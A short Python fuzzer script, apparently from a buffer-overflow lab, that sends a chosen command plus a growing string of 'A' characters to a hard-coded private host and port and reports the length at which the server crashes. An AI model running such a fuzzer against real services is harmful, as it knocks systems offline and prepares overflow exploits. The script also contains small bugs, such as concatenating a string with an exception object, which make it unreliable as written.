import socket

tgt_port = 55665

def exploit(cmd, attempt):
    with socket.socket() as s:
        s.settimeout(5.0)
        try:
            s.connect(("192.168.229.13", tgt_port))
            tmp = s.recv(4096)
            s.send(str.encode(cmd) + b" " + str.encode(attempt))
            tmp = s.recv(4096)
            print(tmp.decode('ascii'))
            return True
        except socket.timeout as e:
            print("The Server started crashing at iteration: " + str(len(attempt)-2))
            return False
        except ConnectionRefusedError as e:
            print("Error: Is the port open?")
            return False
        except Exception as e:
            print("Error: " + e)
            return False

print("*"*40)
print("\t Simple Fuzzer")
print("*"*40)

rounds = int(input("Enter the number of rounds you want to try: "))
cmd = input("Enter the command you want to exploit: ")

for round_int in range(5000,rounds+1):
    attempt = "/.:/" + "A" * (round_int)
    print("Iteration: " + str(round_int))
    passed = exploit(cmd.upper(),attempt)
    if passed == False:
        break
